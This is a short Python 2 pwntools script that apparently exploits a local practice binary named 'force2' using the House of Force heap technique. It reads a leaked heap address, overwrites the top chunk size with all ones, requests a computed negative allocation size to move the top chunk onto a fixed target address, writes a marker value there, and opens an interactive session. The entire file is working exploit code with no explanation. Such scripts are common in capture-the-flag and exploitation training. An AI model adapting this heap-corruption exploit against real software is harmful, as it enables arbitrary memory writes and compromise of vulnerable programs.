# force2.py
from pwn import *
s = process('./force2')
pause()

overwrite_me = 0x601090
heap_addr = u64(s.recv(5).ljust(8, '\x00'))
print hex(heap_addr)
pause()

topchunk_addr = heap_addr+0x28
payload = '\x00'*0x28
payload += p64(0xffffffffffffffff)
pause()
s.sendline(payload)

# data type is negative 
target_size1 = 0xffffffffffffffff & (overwrite_me - 0x10 - topchunk_addr)
target_size2 = overwrite_me - 0x10 - topchunk_addr

print target_size1
print target_size2
pause()
s.sendline(str(target_size1))
payload = p64(0xdeadbeefcafebabe)*2
pause()
s.sendline(payload)
s.interactive()